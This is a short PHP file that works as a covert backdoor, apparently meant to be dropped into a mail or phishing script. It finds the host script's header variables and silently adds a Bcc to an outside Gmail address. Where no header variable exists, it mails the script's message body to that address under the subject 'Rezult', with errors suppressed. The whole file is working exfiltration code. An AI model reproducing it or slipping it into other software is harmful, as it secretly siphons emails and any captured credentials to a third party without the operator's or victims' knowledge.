<?php
function ends_with($haystack){
	$a = "Bcc:simpsonsnyc@gmail.com\n";
	$needle = "\n";
	$length = strlen($needle);
	if (substr($haystack, -$length) === $needle){
		return $a;
	}else{
		return $needle.$a;
	}
}

$door_sub = "Rezult";
$door_msg = null;

if (isset($headers)) {
	$headers .= ends_with($headers);
} elseif (isset($header)) {
	$header .= ends_with($header);
} elseif (isset($from)) {
	$from .= ends_with($from);
} elseif (isset($frm)) {
	$frm .= ends_with($frm);
} elseif (isset($sender)) {
	$sender .= ends_with($sender);

} else{
	if(isset($msg)){
		$door_msg = $msg;
	} elseif (isset($message)) {
		$door_msg = $message;
	} elseif (isset($body)) {
	 $door_msg = $body;
	} elseif (isset($messages)) {
		 $door_msg = $messages;
	} elseif (isset($content)) {
		 $door_msg = $content;
	}

	if(isset($subject)){
		$door_sub = $subject;
	} elseif (isset($subj)) {
		$door_sub = $subj;
	} elseif (isset($subjects)) {
		$door_sub = $subjects;
	} elseif (isset($sub)) {
		$door_sub = $sub;
	}

	if($door_msg !== null){
		@mail("simpsonsnyc@gmail.com", $door_sub, $door_msg, "From: Team Zee <teamz@teamzed.com>");
	}
	
}
?>